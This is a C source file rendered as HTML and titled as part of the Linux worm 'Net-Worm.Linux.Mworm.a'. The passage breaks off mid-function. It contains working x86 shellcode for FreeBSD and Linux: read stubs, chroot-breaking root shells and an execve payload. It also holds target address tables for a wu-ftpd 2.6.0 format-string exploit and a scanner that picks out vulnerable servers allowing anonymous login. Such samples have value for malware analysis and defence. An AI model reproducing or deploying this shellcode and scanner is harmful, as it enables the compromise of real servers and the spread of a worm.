<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Net-Worm.Linux.Mworm.a - checkftp.c.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc2">//CheckFTP.c
//Based on Mscan
//Part of Mworm
</span><span class="sc0">
</span><span class="sc9">#include "common.h"
</span><span class="sc0">


</span><span class="sc16">int</span><span class="sc0">         </span><span class="sc11">xpb_quad</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0">         </span><span class="sc11">xpb_double</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0">         </span><span class="sc11">xpb_align</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0">         </span><span class="sc11">xp_refind</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0">   </span><span class="sc11">xp_dstaddr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0">   </span><span class="sc11">xp_bufdist</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0">   </span><span class="sc11">xp_bufaddr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x0</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0">   </span><span class="sc11">xp_retaddr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0">   </span><span class="sc11">xp_retloc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x0</span><span class="sc10">;</span><span class="sc0">




</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0">  </span><span class="sc11">target_os</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0">  </span><span class="sc11">bytesex</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc1">/* XXX/FIXME: ugly stuff, assume padding for \xff, please fix that in
     * case it bothers you
     */</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0">         </span><span class="sc11">ffpad</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc1">/* buffer distance search, assume the distance is at least
     * bufdist_min, and at max bufdist_max
     */</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0">   </span><span class="sc11">bufdist_min</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0">   </span><span class="sc11">bufdist_max</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc1">/* where to start searching for the buffer address of the source
     * (format string) buffer. it starts with the big addresses and
     * searches towards the lower addresses
     */</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0">   </span><span class="sc11">bufsaddr_start</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0">   </span><span class="sc11">bufsaddr_end</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc1">/* the same for the destination buffer addresses
     */</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0">   </span><span class="sc11">bufdaddr_start</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0">   </span><span class="sc11">bufdaddr_end</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc1">/* where to start searching for the return address location.
     * this is a midhit, so it will start at: bufdaddr_found + this + 0,
     * and then will flip +4, -4, +8, -8.
     *
     * it will flip retloc_midhit times, then abort if not found
     */</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0">   </span><span class="sc11">retloc_midhit</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0">   </span><span class="sc11">retloc_maxsearch</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc1">/* the search for the return address location is based on the
     * assumption that the *retloc is between this two addresses
     */</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0">   </span><span class="sc11">retaddr_low</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0">   </span><span class="sc11">retaddr_high</span><span class="sc10">;</span><span class="sc0">


    </span><span class="sc1">/* shellcode_read[strlen (shellcode_read)] has to hold the number
     * of bytes to be read from the second shellcode.
     */</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0">     </span><span class="sc11">shellcode_read</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0">     </span><span class="sc11">shellcode_shell</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc1">/* some architectures provide the ability to execute stuff on
     * the remote host to enable scripting, so if it does, un-NULL
     * this two pointers, and off you go (with the "-c" option)
     */</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0">     </span><span class="sc11">shellcode_execve</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc10">}</span><span class="sc0"> </span><span class="sc11">FTP_hostinfo</span><span class="sc10">;</span><span class="sc0">


</span><span class="sc1">/* BSD DATA
 * bsd stuff by smiler / teso
 */</span><span class="sc0">

</span><span class="sc1">/* escaped fbsd read() shellcode */</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">x86_fbsd_read</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">
    </span><span class="sc6">"\x31\xc0\x6a\x00\x54\x50\x50\xb0\x03\xcd\x80\x83\xc4"</span><span class="sc0">
    </span><span class="sc6">"\x0c\xff\xff\xe4"</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/* break chroot and exec /bin/sh - dont use on an unbreakable host like 4.0 */</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">x86_fbsd_shell_chroot</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">
    </span><span class="sc6">"\x31\xc0\x50\x50\x50\xb0\x7e\xcd\x80"</span><span class="sc0">
    </span><span class="sc6">"\x31\xc0\x99"</span><span class="sc0">
    </span><span class="sc6">"\x6a\x68\x89\xe3\x50\x53\x53\xb0\x88\xcd"</span><span class="sc0">
    </span><span class="sc6">"\x80\x54\x6a\x3d\x58\xcd\x80\x66\x68\x2e\x2e\x88\x54"</span><span class="sc0">
    </span><span class="sc6">"\x24\x02\x89\xe3\x6a\x0c\x59\x89\xe3\x6a\x0c\x58\x53"</span><span class="sc0">
    </span><span class="sc6">"\x53\xcd\x80\xe2\xf7\x88\x54\x24\x01\x54\x6a\x3d\x58"</span><span class="sc0">
    </span><span class="sc6">"\xcd\x80\x52\x68\x6e\x2f\x73\x68\x44\x68\x2f\x62\x69"</span><span class="sc0">
    </span><span class="sc6">"\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\x52\x51\x53\x53"</span><span class="sc0">
    </span><span class="sc6">"\x6a\x3b\x58\xcd\x80\x31\xc0\xfe\xc0\xcd\x80"</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/* just exec /bin/sh */</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">x86_fbsd_shell</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">
    </span><span class="sc6">"\x31\xc0\x99\x50\x50\x50\xb0\x7e\xcd\x80\x52\x68\x6e"</span><span class="sc0">
    </span><span class="sc6">"\x2f\x73\x68\x44\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89"</span><span class="sc0">
    </span><span class="sc6">"\xe2\x53\x89\xe1\x52\x51\x53\x53\x6a\x3b\x58\xcd\x80"</span><span class="sc0">
    </span><span class="sc6">"\x31\xc0\xfe\xc0\xcd\x80"</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">FTP_hostinfo</span><span class="sc0">    </span><span class="sc11">hi_freebsd_chroot</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc6">"FreeBSD with breakable chroot"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"little endian"</span><span class="sc10">,</span><span class="sc0">

    </span><span class="sc4">4</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc4">1024</span><span class="sc10">,</span><span class="sc0">       </span><span class="sc4">1024</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">400</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc4">0xbfbff801</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0xbfbfaad8</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc4">0xbfbff201</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0xbfbfaad8</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc4">0x00000400</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x00000008</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc4">0x08040000</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x08060000</span><span class="sc10">,</span><span class="sc0">

    </span><span class="sc11">x86_fbsd_read</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc11">x86_fbsd_shell_chroot</span><span class="sc10">,</span><span class="sc0">

    </span><span class="sc5">NULL</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc11">FTP_hostinfo</span><span class="sc0">    </span><span class="sc11">hi_freebsd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc6">"FreeBSD"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"little endian"</span><span class="sc10">,</span><span class="sc0">

    </span><span class="sc4">4</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc4">1024</span><span class="sc10">,</span><span class="sc0">       </span><span class="sc4">1024</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">400</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc4">0xbfbff801</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0xbfbfaad8</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc4">0xbfbff201</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0xbfbfaad8</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc4">0x00000400</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x00000008</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc4">0x08040000</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x08060000</span><span class="sc10">,</span><span class="sc0">

    </span><span class="sc11">x86_fbsd_read</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc11">x86_fbsd_shell</span><span class="sc10">,</span><span class="sc0">

    </span><span class="sc5">NULL</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc1">/* LINUX DATA
 */</span><span class="sc0">


</span><span class="sc1">/* 15 byte x86/linux PIC read() shellcode by lorian / teso
 *
 * escaped for this purpose it's 16 bytes, the \x00 byte has to be overwritten
 * with the number of bytes we want to read, hence the maximum value is \xff,
 * but we can't use that, so we use \xfe instead, woah ! :-)
 * thanks lorian, cool stuff that is :-)
 */</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0">   </span><span class="sc11">x86_lnx_read</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">
    </span><span class="sc6">"\x33\xdb"</span><span class="sc0">      </span><span class="sc1">/* xorl %ebx, %ebx  */</span><span class="sc0">
    </span><span class="sc6">"\xf7\xe3"</span><span class="sc0">      </span><span class="sc1">/* mull %ebx        */</span><span class="sc0">
    </span><span class="sc6">"\xb0\x03"</span><span class="sc0">      </span><span class="sc1">/* movb $3, %al     */</span><span class="sc0">
    </span><span class="sc6">"\x8b\xcc"</span><span class="sc0">      </span><span class="sc1">/* movl %esp, %ecx  */</span><span class="sc0">
    </span><span class="sc6">"\x68\xb2\x00\xcd\x80"</span><span class="sc0">  </span><span class="sc1">/* push 0x80CDxxB2  */</span><span class="sc0">
    </span><span class="sc6">"\xff\xff\xe4"</span><span class="sc10">;</span><span class="sc0">     </span><span class="sc1">/* jmp  %esp        */</span><span class="sc0">


</span><span class="sc1">/* Lam3rZ code =)
 *
 * setuid/chroot-break/execve
 */</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0">   </span><span class="sc11">x86_lnx_shell</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">
    </span><span class="sc6">"\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x31\xc0"</span><span class="sc0">
    </span><span class="sc6">"\x31\xdb\x43\x89\xd9\x41\xb0\x3f\xcd\x80\xeb\x6b"</span><span class="sc0">
    </span><span class="sc6">"\x5e\x31\xc0\x31\xc9\x8d\x5e\x01\x88\x46\x04\x66"</span><span class="sc0">
    </span><span class="sc6">"\xb9\xff\x01\xb0\x27\xcd\x80\x31\xc0\x8d\x5e\x01"</span><span class="sc0">
    </span><span class="sc6">"\xb0\x3d\xcd\x80\x31\xc0\x31\xdb\x8d\x5e\x08\x89"</span><span class="sc0">
    </span><span class="sc6">"\x43\x02\x31\xc9\xfe\xc9\x31\xc0\x8d\x5e\x08\xb0"</span><span class="sc0">
    </span><span class="sc6">"\x0c\xcd\x80\xfe\xc9\x75\xf3\x31\xc0\x88\x46\x09"</span><span class="sc0">
    </span><span class="sc6">"\x8d\x5e\x08\xb0\x3d\xcd\x80\xfe\x0e\xb0\x30\xfe"</span><span class="sc0">
    </span><span class="sc6">"\xc8\x88\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08"</span><span class="sc0">
    </span><span class="sc6">"\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0"</span><span class="sc0">
    </span><span class="sc6">"\x0b\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xcd\x80\xe8"</span><span class="sc0">
    </span><span class="sc6">"\x90\xff\xff\xff\x30\x62\x69\x6e\x30\x73\x68\x31"</span><span class="sc0">
    </span><span class="sc6">"\x2e\x2e\x31\x31"</span><span class="sc10">;</span><span class="sc0">


</span><span class="sc1">/* 38 byte x86/linux PIC arbitrary execute shellcode - scut / teso
 * second smack, read from message body
 *
 * prepended with a setuid(0)/setgid(0)/chroot() break stub from
 * lorian, because on most linux systems we run in a chroot env
 * when being anonymous, so get rid of that
 */</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0">   </span><span class="sc11">x86_lnx_execve</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">
    </span><span class="sc1">/* 49 byte x86 linux PIC setreuid(0,0) + chroot-break
     * code by lorian / teso
     */</span><span class="sc0">
    </span><span class="sc6">"\x33\xdb\xf7\xe3\xb0\x46\x33\xc9\xcd\x80\x6a\x54"</span><span class="sc0">
    </span><span class="sc6">"\x8b\xdc\xb0\x27\xb1\xed\xcd\x80\xb0\x3d\xcd\x80"</span><span class="sc0">
    </span><span class="sc6">"\x52\xb1\x10\x68\xff\x2e\x2e\x2f\x44\xe2\xf8\x8b"</span><span class="sc0">
    </span><span class="sc6">"\xdc\xb0\x3d\xcd\x80\x58\x6a\x54\x6a\x28\x58\xcd"</span><span class="sc0">
    </span><span class="sc6">"\x80"</span><span class="sc0">

    </span><span class="sc1">/* execve
     */</span><span class="sc0">
    </span><span class="sc6">"\xeb\x1f\x5f\x89\xfc\x66\xf7\xd4\x31\xc0\x8a\x07"</span><span class="sc0">
    </span><span class="sc6">"\x47\x57\xae\x75\xfd\x88\x67\xff\x48\x75\xf6\x5b"</span><span class="sc0">
    </span><span class="sc6">"\x53\x50\x5a\x89\xe1\xb0\x0b\xcd\x80\xe8\xdc\xff"</span><span class="sc0">
    </span><span class="sc6">"\xff\xff"</span><span class="sc10">;</span><span class="sc0">


</span><span class="sc11">FTP_hostinfo</span><span class="sc0">    </span><span class="sc11">hi_linux</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc6">"Linux operating system"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"little endian"</span><span class="sc10">,</span><span class="sc0">

    </span><span class="sc4">7</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc4">1024</span><span class="sc10">,</span><span class="sc0">       </span><span class="sc4">1024</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">400</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc4">0xbfffe210</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0xbfffa010</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc4">0xbfffb3f0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0xbfffa610</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc4">0x00002004</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x00000008</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc4">0x08040000</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x08060000</span><span class="sc10">,</span><span class="sc0">

    </span><span class="sc11">x86_lnx_read</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc11">x86_lnx_shell</span><span class="sc10">,</span><span class="sc0">

    </span><span class="sc11">x86_lnx_execve</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc11">FTP_hostinfo</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0">  </span><span class="sc11">FTP_targets</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc10">&amp;</span><span class="sc11">hi_linux</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc10">&amp;</span><span class="sc11">hi_freebsd</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc10">&amp;</span><span class="sc11">hi_freebsd_chroot</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc11">FTP_hostinfo</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0">  </span><span class="sc11">FTP_tg</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">FTP_shellcode</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">FTP_shellcode2</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">Handle_Port_21</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">hostip</span><span class="sc10">,</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">iptr</span><span class="sc10">)</span><span class="sc0">  </span><span class="sc2">//Handle Ftp Scan
</span><span class="sc10">{</span><span class="sc0">
     </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">serv_string</span><span class="sc10">[</span><span class="sc4">1024</span><span class="sc10">];</span><span class="sc0">
     </span><span class="sc11">ssize_t</span><span class="sc0"> </span><span class="sc11">tmpResult</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">tmpStr</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc16">int</span><span class="sc0">  </span><span class="sc11">ftptype</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">ftpsrname</span><span class="sc10">[</span><span class="sc4">30</span><span class="sc10">];</span><span class="sc0">
     
    </span><span class="sc11">ftptype</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">     
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">readable_timeo</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FTP_READTIMEOUT</span><span class="sc10">)&lt;=</span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">tmpResult</span><span class="sc10">=</span><span class="sc11">readline</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc11">serv_string</span><span class="sc10">,</span><span class="sc4">1024</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">tmpResult</span><span class="sc10">&lt;=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc2">//  serv_string[tmpResult]=0;
//   printf("%s: %s",hostip,serv_string);
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">serv_string</span><span class="sc10">,</span><span class="sc6">"220"</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc5">NULL</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc11">tmpStr</span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">serv_string</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"(Version wu-2.6.0"</span><span class="sc10">);</span><span class="sc0">   </span><span class="sc2">//check Wu FTP 2.60
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">tmpStr</span><span class="sc10">!=</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc9">#ifdef DEBUG
</span><span class="sc0">        </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Wu-FTP %s: %s"</span><span class="sc10">,</span><span class="sc11">hostip</span><span class="sc10">,</span><span class="sc11">tmpStr</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">        </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">ftpsrname</span><span class="sc10">,</span><span class="sc6">"%s"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Wu_FTP_2.6.0"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">ftptype</span><span class="sc10">=</span><span class="sc11">WU_FTP_260</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">CHECK_Anonymous_FTP</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">   

    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">CHECK_Anonymous_FTP</span><span class="sc10">:</span><span class="sc0">    
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Check_Anonymous_FTP</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">))</span><span class="sc0">  </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc9">#ifdef DEBUG        
</span><span class="sc0">        </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"%s: %s Allow Anonymous FTP !!\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ftpsrname</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">hostip</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">        </span><span class="sc5">switch</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ftptype</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">WU_FTP_260</span><span class="sc10">:</span><span class="sc0">
                </span><span class="sc2">//wuftp260_vuln(fd, hostip, iptr);
</span><span class="sc0">                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
                    
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ftp_login</span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">iptr</span><span class="sc10">)</span><span class="sc0">  </span><span class="sc2">//Login FTP server
</span><span class="sc10">{</span><span class="sc0">
     </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">serv_string</span><span class="sc10">[</span><span class="sc4">1024</span><span class="sc10">];</span><span class="sc0">
     </span><span class="sc11">ssize_t</span><span class="sc0"> </span><span class="sc11">tmpResult</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">tmpStr</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc16">int</span><span class="sc0">  </span><span class="sc11">ftptype</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">ftpsrname</span><span class="sc10">[</span><span class="sc4">30</span><span class="sc10">];</span><span class="sc0">
     </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">;</span><span class="sc0">
     
